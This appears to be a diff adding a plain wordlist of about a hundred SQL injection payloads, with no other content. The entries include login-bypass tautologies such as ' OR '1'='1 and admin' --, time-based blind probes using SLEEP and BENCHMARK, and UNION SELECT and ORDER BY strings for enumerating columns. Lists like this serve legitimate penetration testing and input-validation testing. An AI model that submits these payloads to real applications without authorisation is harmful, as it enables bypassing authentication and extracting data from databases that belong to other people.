@@ -1,0 +1,99 @@
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+admin' --
+admin' #
+admin'/*
+1' OR '1'='1
+1" OR "1"="1
+' OR 'a'='a
+" OR "a"="a
+') OR ('1'='1
+") OR ("1"="1
+' OR 1=1#
+" OR 1=1#
+' OR '1'='1'/*
+admin' OR '1'='1
+admin' OR 1=1--
+' OR '1'='1' --
+" OR "1"="1" --
+' OR 1=1 LIMIT 1--
+" OR 1=1 LIMIT 1--
+' OR ''='
+" OR ""="
+') OR ('x'='x
+') OR 1=1#
+") OR 1=1#
+' OR EXISTS(SELECT 1)
+" OR EXISTS(SELECT 1)
+' OR NOT 'x'='y
+" OR NOT 'x'='y
+' OR 2>1--
+" OR 2>1--
+' OR 'abc'='abc
+" OR "abc"="abc
+' OR SLEEP(5)--
+" OR SLEEP(5)--
+1' OR SLEEP(3)#
+1" OR SLEEP(3)#
+' AND '1'='1
+" AND "1"="1
+' AND 2>1--
+" AND 2>1--
+' AND 'a'='a
+" AND "a"="a
+' AND SLEEP(2)--
+" AND SLEEP(2)--
+' OR BENCHMARK(1000000,MD5(1))--
+" OR BENCHMARK(1000000,MD5(1))--
+' OR ASCII('a')=97--
+" OR ASCII('a')=97--
+1 OR 1=1
+1 OR 'a'='a
+1' UNION SELECT 1,2--
+1" UNION SELECT 1,2--
+' UNION SELECT null--
+" UNION SELECT null--
+' UNION SELECT NULL,NULL--
+" UNION SELECT NULL,NULL--
+-1' UNION SELECT 1,2--
+-1" UNION SELECT 1,2--
+' UNION ALL SELECT 1,2--
+" UNION ALL SELECT 1,2--
+' UNION ALL SELECT NULL,NULL--
+" UNION ALL SELECT NULL,NULL--
+') UNION SELECT 1,2--
+") UNION SELECT 1,2--
+' ORDER BY 1--
+" ORDER BY 1--
+' ORDER BY 2--
+" ORDER BY 2--
+' ORDER BY 3--
+" ORDER BY 3--
+' OR '1'='1' ORDER BY 1--
+" OR "1"="1" ORDER BY 1--
+' OR 1=1 ORDER BY 2--
+" OR 1=1 ORDER BY 2--
+' OR 'a'='a' ORDER BY 3--
+" OR "a"="a" ORDER BY 3--
+' OR CAST('1' AS INT)=1--
+" OR CAST('1' AS INT)=1--
+' OR 1 IN (1,2,3)--
+" OR 1 IN (1,2,3)--
+' OR 1 BETWEEN 1 AND 2--
+" OR 1 BETWEEN 1 AND 2--
+' OR RAND()=RAND()
+" OR RAND()=RAND()
+' OR IF(1=1,1,0)--
+" OR IF(1=1,1,0)--
+' OR COALESCE(NULL,1)=1--
+" OR COALESCE(NULL,1)=1--
+' OR 'x' LIKE 'x
+" OR "x" LIKE "x
+' OR 1 LIKE 1
+" OR 1 LIKE 1
+' OR 'x'>'w'
+" OR 'x'>'w'
+' OR 'x'<'y'
+" OR 'x'<'y'
